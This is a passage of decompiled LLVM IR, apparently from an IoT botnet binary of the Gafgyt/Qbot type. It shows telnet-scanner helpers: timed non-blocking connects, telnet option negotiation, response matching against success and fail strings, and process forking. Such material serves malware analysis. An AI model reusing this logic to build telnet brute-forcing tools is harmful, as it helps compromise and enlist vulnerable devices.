  %v5_9754 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9768 = icmp sgt i32 %v5_9754, 0
  br i1 %v5_9768, label %dec_label_pc_98e8.preheader, label %dec_label_pc_9854.preheader

dec_label_pc_9854.preheader:                      ; preds = %dec_label_pc_96e0
  %v7_985c22 = icmp slt i32 %tmp32, 10
  br i1 %v7_985c22, label %dec_label_pc_9794.lr.ph, label %dec_label_pc_98e8.preheader

dec_label_pc_9794.lr.ph:                          ; preds = %dec_label_pc_9854.preheader, %dec_label_pc_9848
  %stack_var_-44.023 = phi i32 [ %v1_984c, %dec_label_pc_9848 ], [ %tmp32, %dec_label_pc_9854.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9794

dec_label_pc_9794:                                ; preds = %dec_label_pc_9794.lr.ph, %dec_label_pc_9794
  %storemerge514 = phi i32 [ 0, %dec_label_pc_9794.lr.ph ], [ %v1_97a8, %dec_label_pc_9794 ]
  %v5_97a0 = mul nuw nsw i32 %storemerge514, 4
  %v6_97a0 = add i32 %v5_97a0, %v2_96a4
  %v7_97a0 = inttoptr i32 %v6_97a0 to i32*
  store i32 0, i32* %v7_97a0, align 4
  %v1_97a8 = add nuw nsw i32 %storemerge514, 1
  %tmp52 = icmp ult i32 %v1_97a8, 32
  br i1 %tmp52, label %dec_label_pc_9794, label %dec_label_pc_97bc

dec_label_pc_97bc:                                ; preds = %dec_label_pc_9794
  %v2_97dc = load i32, i32* %v1_9700, align 4
  %v2_97f0 = or i32 %v2_97dc, %v6_9710
  store i32 %v2_97f0, i32* %v1_9700, align 4
  %v5_9830 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9844 = icmp sgt i32 %v5_9830, 0
  br i1 %v5_9844, label %dec_label_pc_98e8.preheader, label %dec_label_pc_9848

dec_label_pc_9848:                                ; preds = %dec_label_pc_97bc
  %v1_984c = add nsw i32 %stack_var_-44.023, 1
  %v7_985c = icmp slt i32 %v1_984c, 10
  br i1 %v7_985c, label %dec_label_pc_9794.lr.ph, label %dec_label_pc_98e8.preheader

dec_label_pc_98e8.preheader:                      ; preds = %dec_label_pc_9848, %dec_label_pc_97bc, %dec_label_pc_9854.preheader, %dec_label_pc_96e0
  %v5_9890 = bitcast i8* %stack_var_-185 to i32*
  %not.v7_98f056 = icmp sgt i32 %arg3, 1
  %v2_990858 = icmp eq i1 %not.v7_98f056, false
  br i1 %v2_990858, label %dec_label_pc_9910, label %dec_label_pc_9874

dec_label_pc_9874:                                ; preds = %dec_label_pc_98e8.preheader, %dec_label_pc_98dc
  %v1_98ec61.in = phi i32 [ %v1_98ec61, %dec_label_pc_98dc ], [ %arg3, %dec_label_pc_98e8.preheader ]
  %stack_var_-40.060 = phi i8* [ %v5_98cc, %dec_label_pc_98dc ], [ %arg2, %dec_label_pc_98e8.preheader ]
  %stack_var_-36.059 = phi i32 [ %v1_98e0, %dec_label_pc_98dc ], [ 0, %dec_label_pc_98e8.preheader ]
  %v1_98ec61 = add i32 %v1_98ec61.in, -1
  %v2_9878 = load i32, i32* @global_var_2352c.49, align 4
  %v6_9890 = call i32 @__libc_recv(i32 %v2_9878, i32* %v5_9890, i32 1, i32 0, i32 %v1_98ec61)
  %v7_9898 = icmp eq i32 %v6_9890, 1
  br i1 %v7_9898, label %dec_label_pc_98b8, label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9874
  store i8 0, i8* %stack_var_-40.060, align 1
  br label %dec_label_pc_9924

dec_label_pc_98b8:                                ; preds = %dec_label_pc_9874
  %v3_98b8 = load i8, i8* %stack_var_-185, align 1
  %v4_98bc = ptrtoint i8* %stack_var_-40.060 to i32
  store i8 %v3_98b8, i8* %stack_var_-40.060, align 1
  %v1_98c8 = add i32 %v4_98bc, 1
  %v5_98cc = inttoptr i32 %v1_98c8 to i8*
  %v3_98d0 = load i8, i8* %stack_var_-185, align 1
  %v7_98d4 = icmp eq i8 %v3_98d0, 10
  br i1 %v7_98d4, label %dec_label_pc_9910, label %dec_label_pc_98dc

dec_label_pc_98dc:                                ; preds = %dec_label_pc_98b8
  %v1_98e0 = add i32 %stack_var_-36.059, 1
  %not.v7_98f0 = icmp sgt i32 %v1_98ec61, 1
  %v2_9908 = icmp eq i1 %not.v7_98f0, false
  br i1 %v2_9908, label %dec_label_pc_9910, label %dec_label_pc_9874

dec_label_pc_9910:                                ; preds = %dec_label_pc_98b8, %dec_label_pc_98dc, %dec_label_pc_98e8.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_98e8.preheader ], [ %v1_98e0, %dec_label_pc_98dc ], [ %stack_var_-36.059, %dec_label_pc_98b8 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_98e8.preheader ], [ %v5_98cc, %dec_label_pc_98dc ], [ %v5_98cc, %dec_label_pc_98b8 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_9910
  %storemerge = phi i32 [ -1, %dec_label_pc_98a0 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9910 ]
  %v2_9930 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9930, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_98ec61, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.060, { 1, 2, 0 }
  uselistorder i32 %v1_984c, { 1, 0 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %storemerge426, { 1, 0 }
  uselistorder i32 %v2_96a4, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9910, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9874, { 1, 0 }
  uselistorder label %dec_label_pc_9794, { 1, 0 }
  uselistorder label %dec_label_pc_9794.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_993c = load i32, i32* @fp, align 4
  %v1_9950 = add i32 %arg1, 4
  %v2_9950 = inttoptr i32 %v1_9950 to i32*
  %v3_9950 = load i32, i32* %v2_9950, align 4
  store i32 %v3_9950, i32* @r0, align 4
  %v1_995c = call i32 @__GI_inet_ntoa(i32 %v3_9950)
  store i32 %v3_993c, i32* @fp, align 4
  ret i32 %v1_995c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9974 = load i32, i32* @fp, align 4
  store i32 39292, i32* %stack_var_-4, align 4
  %v2_9978 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9978, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_99a0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_99b4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_99c4 = load i8, i8* %arg3, align 1
  %v2_99c8 = icmp eq i8 %v2_99c4, -1
  br i1 %v2_99c8, label %dec_label_pc_99d0, label %dec_label_pc_99e0

dec_label_pc_99d0:                                ; preds = %entry
  %v3_99c4 = zext i8 %v2_99c4 to i32
  %v6_99dc = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_99c4, i32 %v5_99b4)
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %entry, %dec_label_pc_99d0
  %v3_99e4 = load i32, i32* %stack_var_0, align 4
  %v3_99e8 = call i32 @contains_string(i32 %tmp, i32 %v3_99e4)
  %v2_99f0 = icmp ne i32 %v3_99e8, 0
  %. = zext i1 %v2_99f0 to i32
  store i32 %v3_9974, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_99c4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a60.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a20 = load i32, i32* @fp, align 4
  store i32 %v3_9a20, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9a4c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a60.lr.ph, %dec_label_pc_9a60
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9a60.lr.ph ], [ %v1_9a74, %dec_label_pc_9a60 ]
  %v5_9a6c = mul nuw nsw i32 %storemerge25, 4
  %v6_9a6c = add i32 %v5_9a6c, %v2_9a4c
  %v7_9a6c = inttoptr i32 %v6_9a6c to i32*
  store i32 0, i32* %v7_9a6c, align 4
  %v1_9a74 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9a74, 32
  br i1 %tmp21, label %dec_label_pc_9a60, label %dec_label_pc_9a88

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a60
  %v13_9a20 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a8c = udiv i32 %arg1, 32
  %v3_9a98 = mul nuw nsw i32 %v3_9a8c, 4
  %v2_9aa0 = add nsw i32 %v3_9a98, -136
  %v2_9aa4 = add i32 %v2_9aa0, %v13_9a20
  %v1_9aa8 = inttoptr i32 %v2_9aa4 to i32*
  %v2_9aa8 = load i32, i32* %v1_9aa8, align 4
  %v1_9ab0 = urem i32 %arg1, 32
  %v6_9ab8 = shl i32 1, %v1_9ab0
  %v2_9abc = or i32 %v2_9aa8, %v6_9ab8
  store i32 %v2_9abc, i32* %v1_9aa8, align 4
  %v1_9adc = add i32 %arg1, 1
  %v2_9ae4 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9af8 = call i32 @__libc_select(i32 %v1_9adc, i32 %v2_9a4c, i32 0, i32 0, i32 %v2_9ae4)
  %v5_9b04 = icmp sgt i32 %v5_9af8, 0
  br i1 %v5_9b04, label %dec_label_pc_9b14, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9a88
  br label %dec_label_pc_9b34

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9a88
  %v5_9b28 = inttoptr i32 %arg3 to i32*
  %v6_9b28 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9b28, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9b34

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9b08, %dec_label_pc_9b14
  %storemerge = phi i32 [ %v6_9b28, %dec_label_pc_9b14 ], [ 0, %dec_label_pc_9b08 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9a4c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9b34, { 1, 0 }
  uselistorder label %dec_label_pc_9a60, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9b60 = icmp eq i32 %arg2, 0
  br i1 %v2_9b60, label %dec_label_pc_9b68, label %dec_label_pc_9b78

dec_label_pc_9b68:                                ; preds = %entry
  %v2_9b6c = load i32, i32* %arg1, align 4
  %v1_9b74 = call i32 @__libc_close(i32 %v2_9b6c)
  br label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %entry, %dec_label_pc_9b68
  %v2_9b80 = add i32 %tmp, 16
  %v3_9b80 = inttoptr i32 %v2_9b80 to i32*
  store i32 0, i32* %v3_9b80, align 4
  %v3_9b84 = load i32, i32* %stack_var_-24, align 4
  %v1_9b90 = trunc i32 %v3_9b84 to i8
  %v3_9b90 = add i32 %tmp, 8
  %v4_9b90 = inttoptr i32 %v3_9b90 to i8*
  store i8 %v1_9b90, i8* %v4_9b90, align 1
  %v1_9b98 = add i32 %tmp, 24
  %v2_9b98 = inttoptr i32 %v1_9b98 to i32*
  %v3_9b98 = load i32, i32* %v2_9b98, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9ba8 = inttoptr i32 %v3_9b98 to i8*
  %v3_9ba8 = call i32 @__GI_memset(i8* %v2_9ba8, i32 0)
  ret i32 %v3_9ba8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9bb8 = load i32, i32* @fp, align 4
  %v2_9bd0 = inttoptr i32 %arg1 to i32*
  %v3_9bd0 = call i32 @advance_state(i32* %v2_9bd0, i32 0)
  %v3_9bdc = add i32 %arg1, 9
  %v4_9bdc = inttoptr i32 %v3_9bdc to i8*
  store i8 1, i8* %v4_9bdc, align 1
  store i32 %v3_9bb8, i32* @fp, align 4
  ret i32 %v3_9bd0
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9be8 = load i32, i32* @fp, align 4
  %v3_9c00 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_23168.54 to i32))
  store i32 %v3_9be8, i32* @fp, align 4
  ret i32 %v3_9c00
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c18 = load i32, i32* @fp, align 4
  %v3_9c30 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_23148.63 to i32))
  store i32 %v3_9c18, i32* @fp, align 4
  ret i32 %v3_9c30

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40016, i32* %stack_var_-4, align 4
  %v2_9c4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c4c, i32* @fp, align 4
  %v1_9c5c = call i32 @contains_success(i32 %arg1)
  %v2_9c64 = icmp eq i32 %v1_9c5c, 0
  br i1 %v2_9c64, label %dec_label_pc_9c6c, label %dec_label_pc_9c94

dec_label_pc_9c6c:                                ; preds = %entry
  %v1_9c70 = call i32 @contains_fail(i32 %arg1)
  %v2_9c78 = icmp ne i32 %v1_9c70, 0
  %. = zext i1 %v2_9c78 to i32
  br label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c6c, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9c6c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9cd4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9cd8, %dec_label_pc_9cd4 ]
  %v1_9cd8 = add i32 %stack_var_-24.0, 1
  %v3_9ce4 = mul i32 %v1_9cd8, 4
  %v2_9cf0 = add i32 %v3_9ce4, %arg2
  %v1_9cf4 = inttoptr i32 %v2_9cf0 to i32*
  %v2_9cf4 = load i32, i32* %v1_9cf4, align 4
  %v2_9cf8 = icmp eq i32 %v2_9cf4, 0
  br i1 %v2_9cf8, label %dec_label_pc_9d54.preheader, label %dec_label_pc_9cd4

dec_label_pc_9d54.preheader:                      ; preds = %dec_label_pc_9cd4
  %v3_9d2c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9d54

dec_label_pc_9d0c:                                ; preds = %dec_label_pc_9d54
  %v3_9d10 = mul i32 %storemerge2, 4
  %v2_9d1c = add i32 %v3_9d10, %arg2
  %v1_9d20 = inttoptr i32 %v2_9d1c to i32*
  %v2_9d20 = load i32, i32* %v1_9d20, align 4
  %v4_9d2c = call i32 @strcasestr(i8* %v3_9d2c, i32 %v2_9d20, i32 %v3_9d10)
  %v2_9d34 = icmp eq i32 %v4_9d2c, 0
  %v1_9d4c = add nuw i32 %storemerge2, 1
  br i1 %v2_9d34, label %dec_label_pc_9d54, label %dec_label_pc_9d6c

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d0c, %dec_label_pc_9d54.preheader
  %storemerge2 = phi i32 [ %v1_9d4c, %dec_label_pc_9d0c ], [ 0, %dec_label_pc_9d54.preheader ]
  %v5_9d60 = icmp slt i32 %storemerge2, %v1_9cd8
  br i1 %v5_9d60, label %dec_label_pc_9d0c, label %dec_label_pc_9d6c

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9d0c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9d0c ], [ 0, %dec_label_pc_9d54 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9cd8, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d80 = load i32, i32* @fp, align 4
  store i32 %v3_9d80, i32* %stack_var_-16, align 4
  %v13_9d80 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9da8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9db8 = or i32 %v2_9da8, 2048
  store i32 %v1_9db8, i32* @r2, align 4
  %v2_9dcc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9de8 = urem i32 %arg3, 65536
  %v1_9df0 = call i32 @htons(i32 %v3_9de8)
  %v3_9e18 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e20 = icmp eq i32 %v3_9e18, 0
  br i1 %v2_9e20, label %dec_label_pc_9e34, label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %entry
  br label %dec_label_pc_9fec

dec_label_pc_9e34:                                ; preds = %entry
  %v3_9e5c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e5c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e5c, i32 16)
  %v1_9e6c = icmp slt i32 %v4_9e5c, 0
  br i1 %v1_9e6c, label %dec_label_pc_9e74, label %dec_label_pc_9fb0

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e34
  %v0_9e74 = call i32 @__errno_location()
  %v1_9e7c = inttoptr i32 %v0_9e74 to i32*
  %v2_9e7c = load i32, i32* %v1_9e7c, align 4
  %v7_9e80 = icmp eq i32 %v2_9e7c, 115
  br i1 %v7_9e80, label %dec_label_pc_9eac.lr.ph, label %dec_label_pc_9fa4

dec_label_pc_9eac.lr.ph:                          ; preds = %dec_label_pc_9e74
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9e98 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %dec_label_pc_9eac.lr.ph, %dec_label_pc_9eac
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9eac.lr.ph ], [ %v1_9ec0, %dec_label_pc_9eac ]
  %v5_9eb8 = mul nuw nsw i32 %storemerge14, 4
  %v6_9eb8 = add i32 %v5_9eb8, %v2_9e98
  %v7_9eb8 = inttoptr i32 %v6_9eb8 to i32*
  store i32 0, i32* %v7_9eb8, align 4
  %v1_9ec0 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9ec0, 32
  br i1 %tmp32, label %dec_label_pc_9eac, label %dec_label_pc_9ed4

dec_label_pc_9ed4:                                ; preds = %dec_label_pc_9eac
  %v3_9ed8 = udiv i32 %arg1, 32
  %v3_9ee4 = mul nuw nsw i32 %v3_9ed8, 4
  %v2_9eec = add nsw i32 %v3_9ee4, -160
  %v2_9ef0 = add i32 %v2_9eec, %v13_9d80
  %v1_9ef4 = inttoptr i32 %v2_9ef0 to i32*
  %v2_9ef4 = load i32, i32* %v1_9ef4, align 4
  %v1_9efc = urem i32 %arg1, 32
  %v6_9f04 = shl i32 1, %v1_9efc
  %v2_9f08 = or i32 %v2_9ef4, %v6_9f04
  store i32 %v2_9f08, i32* %v1_9ef4, align 4
  %v1_9f28 = add i32 %arg1, 1
  %v2_9f30 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f48 = call i32 @__libc_select(i32 %v1_9f28, i32 0, i32 %v2_9e98, i32 0, i32 %v2_9f30)
  %tmp33 = icmp slt i32 %v5_9f48, 1
  br i1 %tmp33, label %dec_label_pc_9f98, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9ed4
  %v0_9f7c = call i32 @getsockopt()
  %v3_9f80 = load i32, i32* %stack_var_-192, align 4
  %v2_9f84 = icmp eq i32 %v3_9f80, 0
  br i1 %v2_9f84, label %dec_label_pc_9fb0, label %dec_label_pc_9f8c

dec_label_pc_9f8c:                                ; preds = %dec_label_pc_9f58
  br label %dec_label_pc_9fec

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9ed4
  br label %dec_label_pc_9fec

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9e74
  br label %dec_label_pc_9fec

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9e34, %dec_label_pc_9f58
  store i32 0, i32* @r2, align 4
  %v2_9fbc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9fcc = and i32 %v2_9fbc, -2049
  store i32 %v1_9fcc, i32* @r2, align 4
  %v2_9fe0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9f98, %dec_label_pc_9f8c, %dec_label_pc_9e28, %dec_label_pc_9fb0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9f98 ], [ 1, %dec_label_pc_9fb0 ], [ 0, %dec_label_pc_9f8c ], [ 0, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9e28 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9e98, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9fec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9fb0, { 1, 0 }
  uselistorder label %dec_label_pc_9eac, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9ffc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9ffc, i32* @ip, align 4
  %v3_a000 = load i32, i32* @r4, align 4
  %v6_a000 = load i32, i32* @r5, align 4
  %v9_a000 = load i32, i32* @r6, align 4
  %v0_a00c = call i32 @__libc_fork()
  %v2_a01c = icmp eq i32 %v0_a00c, 0
  br i1 %v2_a01c, label %dec_label_pc_a17c, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %entry
  %v2_a034 = load i32, i32* @global_var_23534.65, align 4
  %v5_a034 = load i32, i32* @global_var_23538.66, align 4
  %v2_a040 = add i32 %v2_a034, 1
  %v3_a040 = icmp eq i32 %v2_a040, 0
  %v4_a044 = zext i1 %v3_a040 to i32
  %v5_a044 = add i32 %v4_a044, %v5_a034
  store i32 %v2_a040, i32* @global_var_23534.65, align 4
  store i32 %v5_a044, i32* @global_var_23538.66, align 4
  %v3_a058 = udiv i32 %v2_a040, 1073741824
  %v3_a05c = mul i32 %v5_a044, 4
  %v2_a060 = or i32 %v3_a05c, %v3_a058
  store i32 %v2_a060, i32* @r4, align 4
  %v3_a064 = mul i32 %v2_a040, 4
  %v1_a068 = add i32 %v3_a064, 4
  %v1_a070 = call i32 @malloc(i32 %v1_a068)
  br label %dec_label_pc_a0c8

dec_label_pc_a088:                                ; preds = %dec_label_pc_a0c8, %dec_label_pc_a114
  %v3_a08c = mul i32 %storemerge2, 4
  %v2_a098 = add i32 %v3_a08c, %v1_a070
  %v2_a0ac = load i32, i32* @global_var_297b8.68, align 4
  %v2_a0b0 = add i32 %v2_a0ac, %v3_a08c
  %v1_a0b4 = inttoptr i32 %v2_a0b0 to i32*
  %v2_a0b4 = load i32, i32* %v1_a0b4, align 4
  %v2_a0b8 = inttoptr i32 %v2_a098 to i32*
  store i32 %v2_a0b4, i32* %v2_a0b8, align 4
  %v1_a0c0 = add i32 %storemerge2, 1
  br label %dec_label_pc_a0c8

dec_label_pc_a0c8:                                ; preds = %dec_label_pc_a030, %dec_label_pc_a088
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a030 ], [ %v1_a0c0, %dec_label_pc_a088 ]
  %v2_a0e0 = load i32, i32* @global_var_23534.65, align 4
  %v5_a0e0 = load i32, i32* @global_var_23538.66, align 4
  %v2_a0f4 = add i32 %v2_a0e0, -1
  %v3_a0f4 = icmp ne i32 %v2_a0e0, 0
  %v3_a0f8 = add i32 %v5_a0e0, -1
  %v5_a0f8 = sext i1 %v3_a0f4 to i32
  %v9_a10c = icmp eq i32 %v3_a0f8, %v5_a0f8
  br i1 %v9_a10c, label %dec_label_pc_a114, label %dec_label_pc_a088

dec_label_pc_a114:                                ; preds = %dec_label_pc_a0c8
  store i32 %v2_a0f4, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a0f4, %storemerge2
  br i1 %tmp, label %dec_label_pc_a088, label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a114
  store i32 %v5_a0e0, i32* @r4, align 4
  %v3_a13c = mul i32 %v2_a0e0, 4
  %v2_a148 = add i32 %v1_a070, -4
  %v1_a14c = add i32 %v2_a148, %v3_a13c
  %v2_a154 = inttoptr i32 %v1_a14c to i32*
  store i32 %v0_a00c, i32* %v2_a154, align 4
  %v2_a15c = load i32, i32* @global_var_297b8.68, align 4
  store i32 %v2_a15c, i32* @r0, align 4
  %v0_a164 = call i32 @free()
  store i32 %v1_a070, i32* @global_var_297b8.68, align 4
  br label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %entry, %dec_label_pc_a134
  store i32 %v3_a000, i32* @r4, align 4
  store i32 %v6_a000, i32* @r5, align 4
  store i32 %v9_a000, i32* @r6, align 4
  ret i32 %v0_a00c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a08c, { 1, 0 }
  uselistorder i32 %v1_a070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a17c, { 1, 0 }
  uselistorder label %dec_label_pc_a0c8, { 1, 0 }
  uselistorder label %dec_label_pc_a088, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a1b4 = add i32 %arg2, 1
  %v1_a1b8 = inttoptr i32 %v1_a1b4 to i8*
  %v2_a1b8 = load i8, i8* %v1_a1b8, align 1
  %v7_a1c4 = icmp ult i8 %v2_a1b8, -5
  br i1 %v7_a1c4, label %dec_label_pc_a310, label %dec_label_pc_a1cc

dec_label_pc_a1cc:                                ; preds = %entry
  %v7_a1d4 = icmp eq i8 %v2_a1b8, -1
  br i1 %v7_a1d4, label %dec_label_pc_a1d8, label %dec_label_pc_a1f4

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a1cc
  br label %dec_label_pc_a310

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a1cc
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a210 = bitcast i8* %stack_var_-17 to i32*
  %v6_a210 = call i32 @__libc_send(i32 %arg1, i32* %v5_a210, i32 1, i32 16384)
  %v2_a21c = load i8, i8* %v1_a1b8, align 1
  %v7_a220 = icmp eq i8 %v2_a21c, -4
  br i1 %v7_a220, label %dec_label_pc_a228, label %dec_label_pc_a234

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1f4
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a234:                                ; preds = %dec_label_pc_a1f4
  %v2_a23c = load i8, i8* %v1_a1b8, align 1
  %v7_a240 = icmp eq i8 %v2_a23c, -2
  br i1 %v7_a240, label %dec_label_pc_a248, label %dec_label_pc_a254

dec_label_pc_a248:                                ; preds = %dec_label_pc_a234
